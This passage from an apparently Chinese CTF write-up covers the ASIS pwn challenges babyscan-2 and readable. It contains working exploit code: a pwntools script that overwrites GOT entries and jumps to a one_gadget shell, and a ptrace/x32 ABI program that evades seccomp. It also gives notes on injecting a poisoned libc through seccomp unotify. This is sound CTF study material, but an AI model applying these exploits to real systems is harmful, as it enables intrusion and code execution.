class="hljs-number">0xe3b01</span><span class="hljs-comment"># getted by one_gadget</span><br>r.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span>+p64(ogg))<br><br><br>r.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="babyscan-2"><a href="#babyscan-2" class="headerlink" title="babyscan-2"></a>babyscan-2</h2><p>src: </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;ctype.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">char</span> size[<span class="hljs-number">16</span>], fmt[<span class="hljs-number">8</span>], *buf;<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;size: &quot;</span>);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%15s&quot;</span>, size);<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">isdigit</span>(*size))<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[-] Invalid number&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br><br>  buf = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(atoi(size) + <span class="hljs-number">1</span>);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;data: &quot;</span>);<br>  <span class="hljs-built_in">snprintf</span>(fmt, <span class="hljs-keyword">sizeof</span>(fmt), <span class="hljs-string">&quot;%%%ss&quot;</span>, size); <span class="hljs-comment">//vuln is here</span><br>  <span class="hljs-built_in">scanf</span>(fmt, buf);<br><br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br>__attribute__((constructor))<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setup</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br>  setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-literal">NULL</span>);<br>  alarm(<span class="hljs-number">180</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>exp: 来自r3kapig-Lotus</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.terminal = [<span class="hljs-string">&#x27;gnome-terminal&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>]<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>r = process(<span class="hljs-string">&#x27;/mnt/hgfs/ubuntu/ASIS/babyscan2/bin/chall&#x27;</span>)<br><span class="hljs-comment">#r = remote(&#x27;65.21.255.31&#x27;,33710)</span><br>elf = ELF(<span class="hljs-string">&#x27;/mnt/hgfs/ubuntu/ASIS/babyscan2/bin/chall&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/mnt/hgfs/ubuntu/ASIS/babyscan2/lib/libc.so.6&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Lotus_write</span>(<span class="hljs-params">addr,content</span>):</span><br>    r.recvuntil(<span class="hljs-string">b&quot;size: &quot;</span>)<br>    r.send(<span class="hljs-string">b&#x27;9$\x00\x00\x00\x00\x00\x00&#x27;</span>+p64(addr)[:<span class="hljs-number">7</span>])<br>    r.recvuntil(<span class="hljs-string">&quot;data: &quot;</span>)<br>    r.sendline(content)<br><br><span class="hljs-comment"># gdb.attach(r,&#x27;b *0x40132b&#x27;)</span><br><span class="hljs-comment"># gdb.attach(r,&#x27;b *0x401286&#x27;)</span><br><span class="hljs-comment"># Lotus_write(elf.got[&quot;atoi&quot;],p64(elf.plt[&quot;printf&quot;])+p64(0x401140)+p64(0x401256)[:7])</span><br>Lotus_write(elf.got[<span class="hljs-string">&quot;exit&quot;</span>],p64(<span class="hljs-number">0x401256</span>)[:<span class="hljs-number">7</span>])<br><span class="hljs-comment"># gdb.attach(r,&#x27;b *0x40128B&#x27;)</span><br><span class="hljs-comment"># r.recvuntil(b&quot;size: &quot;)</span><br><span class="hljs-comment"># r.sendline(b&#x27;%p&#x27;)</span><br><br><span class="hljs-comment"># print(hex(elf.plt[&quot;atoi&quot;]))</span><br>Lotus_write(elf.got[<span class="hljs-string">&quot;atoi&quot;</span>],p64(elf.plt[<span class="hljs-string">&quot;printf&quot;</span>])[:<span class="hljs-number">7</span>])<br><span class="hljs-comment"># gdb.attach(r,&#x27;b *0x4012CD&#x27;)</span><br><br>r.recvuntil(<span class="hljs-string">b&quot;size: &quot;</span>)<br>r.sendline(<span class="hljs-string">b&#x27;1-%9$p+&#x27;</span>)<br>r.recvuntil(<span class="hljs-string">b&#x27;-&#x27;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(r.recvuntil(<span class="hljs-string">b&#x27;+&#x27;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)-<span class="hljs-number">0x9A154</span><br>r.recvuntil(<span class="hljs-string">b&quot;data: &quot;</span>)<br>r.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>)<br>ogg = libc_base+<span class="hljs-number">0xe3b01</span><br>Lotus_write(elf.got[<span class="hljs-string">&quot;printf&quot;</span>],p64(ogg)[:<span class="hljs-number">7</span>])<br><span class="hljs-comment"># gdb.attach(r)</span><br><span class="hljs-comment"># r.recvuntil(b&quot;size: &quot;)</span><br><span class="hljs-comment"># r.sendline(b&#x27;15&#x27;)</span><br><br>log.success(<span class="hljs-string">&quot;libc_base: &quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>r.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="readable"><a href="#readable" class="headerlink" title="readable"></a>readable</h2><p>终于发现了这题目环境的用法, 先是build.sh编译一下然后再docker build, 然后deploy.py中有一句socat命令是在本地开一个端口接收exp文件, 保存为tempfile, 然后映射到docker中的<code>/tmp/exploit</code>, 继续启动docker, 完成权限设置之后执行/home/pwn/run. run设置了seccomp之后execve了exploit, 然后再怎么执行readme就是我们的事了. </p><h3 id="solution-1"><a href="#solution-1" class="headerlink" title="solution 1"></a>solution 1</h3><p>X32 ABI直接ptrace拿mmap的pie基址劫持write直接leak, 直接利用mmap系统调用时的地址信息打印出前0x2000的东西, 这样直接就可以发现flag. </p><p>这个编译起来不得使用32位? 试下. 还是得64位. </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ptrace.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/personality.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/user.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> base = <span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_regs_struct</span> *<span class="hljs-title">regs</span> =</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;   <br>    <span class="hljs-comment">// X32 ABI 对指针要求 32 位</span><br>    regs = mmap((<span class="hljs-keyword">void</span> *)<span class="hljs-number">0x233000</span>,<span class="hljs-number">0x1000</span>,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANONYMOUS,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">pid_t</span> traced_process;<br>    <span class="hljs-keyword">long</span> ins;<br>    <span class="hljs-keyword">char</span> *argvs[] = &#123;<span class="hljs-string">&quot;/home/pipe/readme&quot;</span>,<span class="hljs-literal">NULL</span>&#125;;<br>    <span class="hljs-keyword">int</span> pid = fork();<br>    <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// ptrace(PTRACE_TRACEME, 0, 0, 0);</span><br>        syscall(<span class="hljs-number">0x40000209</span>,PTRACE_TRACEME, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        execve(<span class="hljs-string">&quot;/home/pipe/readme&quot;</span>, argvs, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;exec failed&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    wait(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">int</span> blocked = <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">// Wait until the child makes a syscall</span><br>        <span class="hljs-comment">// ptrace(PTRACE_SYSCALL, pid, 0, 0);</span><br>        syscall(<span class="hljs-number">0x40000209</span>,PTRACE_SYSCALL, pid, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        <br>        waitpid(pid, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        <br>        <span class="hljs-comment">// ptrace(PTRACE_GETREGS, pid, 0, &amp;regs);</span><br>        syscall(<span class="hljs-number">0x40000209</span>,PTRACE_GETREGS, pid, <span class="hljs-number">0</span>, regs);<br>        <span class="hljs-comment">// 获取程序基址，用 strace 在本地观察得到特征</span><br>        <span class="hljs-keyword">if</span>(regs-&gt;orig_rax == <span class="hljs-number">10</span> &amp;&amp; regs-&gt;rsi==<span class="hljs-number">0x1000</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Mmap Rdi:%08llx\nMmap Rsi:%08llx\nMmap Rdx:%08llx\n&quot;</span>,regs-&gt;rdi,regs-&gt;rsi,regs-&gt;rdx);<br>            base = regs-&gt;rdi;<br>        &#125;<br>        <span class="hljs-comment">// 随便劫持一个 Write 的系统调用，rsi 劫持到基址，rdx 大小大一点</span><br>        <span class="hljs-keyword">if</span> (regs-&gt;orig_rax == <span class="hljs-number">1</span> &amp;&amp; regs-&gt;rdx == <span class="hljs-number">0x10</span>) &#123;<br>            blocked = <span class="hljs-number">1</span>;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Rsi before:%08llx\n&quot;</span>,regs-&gt;rsi);<br>            regs-&gt;rdx = <span class="hljs-number">0x2000</span>;<br>            regs-&gt;rsi = base;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Rsi after:%08llx\n&quot;</span>,regs-&gt;rsi);<br>            <span class="hljs-comment">// ptrace(PTRACE_SETREGS, pid, 0, regs);</span><br>            syscall(<span class="hljs-number">0x40000209</span>,PTRACE_SETREGS, pid, <span class="hljs-number">0</span>, regs);<br>        &#125;<br>        <span class="hljs-comment">// Continue on with the now blocked syscall</span><br>        <span class="hljs-comment">// ptrace(PTRACE_SYSCALL, pid, 0, 0);</span><br>        syscall(<span class="hljs-number">0x40000209</span>,PTRACE_SYSCALL, pid, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>        waitpid(pid, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-comment">// If the program checks return value of the write, we need to make sure that the return value isn&#x27;t `-ENOSYS`</span><br>        <span class="hljs-comment">// if (blocked) &#123;regs-&gt;rax = 1; ptrace(PTRACE_SETREGS, pid, 0, regs); &#125;</span><br>        <span class="hljs-keyword">if</span> (blocked) &#123;regs-&gt;rax = <span class="hljs-number">1</span>; syscall(<span class="hljs-number">0x40000209</span>,PTRACE_SETREGS, pid, <span class="hljs-number">0</span>, regs); <span class="hljs-keyword">break</span>;&#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>真正的系统调用号保存在 /usr/include/x86_64-linux-gnu/asm/unistd_x32.h：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> _ASM_X86_UNISTD_X32_H</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _ASM_X86_UNISTD_X32_H 1</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_read (__X32_SYSCALL_BIT + 0)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_write (__X32_SYSCALL_BIT + 1)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_open (__X32_SYSCALL_BIT + 2)</span><br>...<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_ioctl (__X32_SYSCALL_BIT + 514)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_readv (__X32_SYSCALL_BIT + 515)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_writev (__X32_SYSCALL_BIT + 516)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_recvfrom (__X32_SYSCALL_BIT + 517)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_sendmsg (__X32_SYSCALL_BIT + 518)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_recvmsg (__X32_SYSCALL_BIT + 519)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_execve (__X32_SYSCALL_BIT + 520)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_ptrace (__X32_SYSCALL_BIT + 521)</span><br>...<br></code></pre></div></td></tr></table></figure><ul><li><p>而<code>__X32_SYSCALL_BIT</code>的值为<code>0x40000000</code>, 所以上面的数值上就可以解释了. </p></li><li><p>int 0x80 和 syscall 的<a href="https://stackoverflow.com/questions/46087730#answer-46087731">区别</a> (好吧跟这个没啥关系. </p></li><li><p>主要利用点在于x64下有一种x32 ABI模式, 能够在减小指针和地址空间开销的同时利用起64位cpu上多的寄存器和运算部件, 提高程序运行速度. 他的系统调用就如上面所示, 只要加上一个数值即可, 或者说是按位或(|). 而寄存器高32位的部分都被清空, 以此模拟32位运行状态. </p></li></ul><p>还没有run过, 第二天环境弄一个小时没整好, 看来还是得靠docker. 终于知道了这一堆东西怎么用了. </p><p>不过为什么没法直接跑通? 看着挺好的呀, 但是看起来ptrace全都失败了, regs里面没有一点信息. </p><p>我还不知道在docker里面运行的程序如何调试. </p><p>ptrace真的fail了, 返回了一个-1. 继续查查errno看是什么. 是not implement. 不知道了. 只能一问队友. </p><p>crazyman说ubuntu18能行, 但是docker里面改成18.04并不可行. emmmmm?难道不是这样么?</p><p>22/11/14<strong>在编译linux时发现有一个选项是x32 ABI for 64 bit mode</strong>, 勾上了重新编译, 尝试了下能不能运行. </p><p>修改HOME路径, 再把readme重新编译成静态文件, 放到HOME中设置成其他用户只读, 忽略run.c(因为他只是限制了一下可用的系统调用)</p><p>还是遇到了很多问题. </p><ul><li>使用busybox的linux还是有很多限制, 每个文件都得编译成静态文件, 使得本来是PIE的readme变成静态链接文件, 然后mmap调用似乎消失了, ptrace根本截取不到(???), 也没有strace看到底发生了什么. </li><li>而且静态链接也使得文件变得很大, 仅输出前面0x2000字节还是不够, 还得调整. </li></ul><p>不过好在发现了这个方法<strong>确实可行</strong>, 不过docker里面的系统似乎都没有加上这一个选项, 想来当时比赛时的环境可以吧. 不过明明都是同一个Dockerfile怎么还不一样呢. </p><h3 id="solution-2-intended-one"><a href="#solution-2-intended-one" class="headerlink" title="solution 2 - intended one"></a>solution 2 - intended one</h3><blockquote><p>given by the author</p></blockquote><h4 id="作者原话"><a href="#作者原话" class="headerlink" title="作者原话:"></a>作者原话:</h4><ul><li>Intended way was using seccomp unotify to change libc binary</li><li>Linker loads libc, you set a hook for openat. And then use seccomp_setfd to send a poisoned libc</li></ul><p>seccomp unotify: user notify, 可以做到在syscall的时候携带信息给supervisor(大多都是container应用), 让它来决定是继续执行syscall还是停止执行并返回特定数值. </p><h4 id="流程"><a href="#流程" class="headerlink" title="流程:"></a>流程:</h4><ul><li>solve.py上传了exploit, 然后exploit在docker里接受payload放到<code>/tmp/payload</code>. </li><li>exp使用UNIX domain socket建立程序间通信渠道. </li><li>装载sigchild signal的处理函数, handler直接执行<code>exit()</code>. </li><li>fork出子进程, 一通prctl+install seccomp unotifier之后通过socket发送notifyfd到父进程, 再执行<code>/home/pwn/readme</code>.<br>其中install的规则主要是为openat装载unotify. </li><li>(然后都是unotify supervisor的基本流程)</li><li>通过socket接受unotify fd. (这个流程也很长, 使用了recvmsg等一系列奇怪函数, 不管了.)</li><li>通过ioctl来轮询fd, 当readme openat的时候会被打断, 此时由父进程打开payload文件, 然后通过seccomp_notif_addfd来复制fd到子进程的fd列表之中, 由ioctl返回在子进程中最终打开的fd number, 最后response, 设置openat syscall的返回值为该fd number. </li><li>上面的流程是一个死循环, 由child exit到signal handler终止所有进程.  </li></ul><h4 id="关键点"><a href="#关键点" class="headerlink" title="关键点:"></a>关键点:</h4><ul><li>UNIX domain socket or IPC socket</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/socket.h&gt;</span></span><br>sockfd = socket(<span class="hljs-keyword">int</span> socket_family, <span class="hljs-keyword">int</span> socket_type, <span class="hljs-keyword">int</span> protocol);<br></code></pre></div></td></tr></table></figure><p>其中socket_family=AF_UNIX, socket_type有三种(TCP UDP SCTP?)</p><p>send是fd和recvfd函数都是使用sendmsg来…..看不懂, 一堆宏定义, 反正知道他能通过socket fd来传递fd就行了. </p><ul><li>seccomp unotify:<code>seccomp(SECCOMP_SET_MODE_FILTER, SECCOMP_FILTER_FLAG_NEW_LISTENER, &amp;prog);</code> </li></ul><p>因为glibc没有对seccomp wrap, 所以实际上是:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">seccomp</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> operation, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> flags, <span class="hljs-keyword">void</span> *args)</span></span>&#123;<br>  <span class="hljs-keyword">return</span> syscall(__NR_seccomp, operation, flags, args); &#125;<br></code></pre></div></td></tr></table></figure><p>第一个<code>SECCOMP_SET_MODE_FILTER</code>就是指把arg当成BPF指针来定义一个filter. 这个filter在fork clone execve的时候保留下来. <strong>前提</strong>是调用的线程必须在它的namespace里有CAP_SYS_ADMIN, 或者已经设置了no_new_privs位. </p><p>一般都关注后者, 也就是通过<code>prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)</code>设置. 这个process control函数配上这些参数能够限制execve执行setuid的程序, 否则通过execve执行setuid程序后装载一个不执行<code>setuid()</code>且返回0的filter时, 这样的程序会在没有真正drop privileges的情况下继续运行malicious commands. </p><p>而第二个参数flags要使用<code>SECCOMP_FILTER_FLAG_NEW_LISTENER</code>, 这样成功安装filter后，返回一个新的user-space notification file。(为文件描述符设置了“close-on-exec” flag。)当filter返回SECCOMP_RET_USER_NOTIF时，将向该fd发送通知。每线程最多只能装载一个带有这个flag的filter.</p><ul><li><code>SECCOMP_IOCTL_NOTIF_ADDFD</code> </li></ul><p>The SECCOMP_IOCTL_NOTIF_ADDFD operation (available since Linux5.9) allows the supervisor to <strong>install a file descriptor</strong> into thetarget’s file descriptor table. </p><ul><li><a href="http://web.mit.edu/rhel-doc/3/rhel-as-en-3/symver.html"><code>.symver</code></a> directive and <a href="https://gcc.gnu.org/wiki/SymbolVersioning">SymbolVersioning</a> | <a href="https://sourceware.org/binutils/docs/ld/VERSION.html"><em>linker script</em> VERSION command</a> </li></ul><p>总之就是将symbol绑定到version node上, 一个symbol可以有多个version node, 最关键的是map file.</p><p>同时可以在库的源代码中添加绑定信息, 这样可以减少shared library maintainr的工作, 不过此时mapfile必须包括所有的version node, 也就是这个asm trick只是mapfile的补充. </p><p>经过测试, solution中的payload.c可以大幅度缩减, payload.map也可以删去2.34的定义:</p><ul><li>puts完全没必要, 只要<code>__libc_start_main</code>被修改为write函数之后就已经达成目的. </li><li>源码中使用asm把<code>__libc_start_main_impl</code>当做<code>__libc_start_main</code>的alias,<br>不过也可以直接不要impl, 直接<code>__libc_start_main</code>就行了</li><li>头文件也没必要. 2.2.5也没必要. 为什么是这个版本号我也不知道. </li><li>过了一个月再试发现payload.map里2.2.5和2.34都不能删去, 否则libc会报version not found. 原因未知.</li></ul><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span 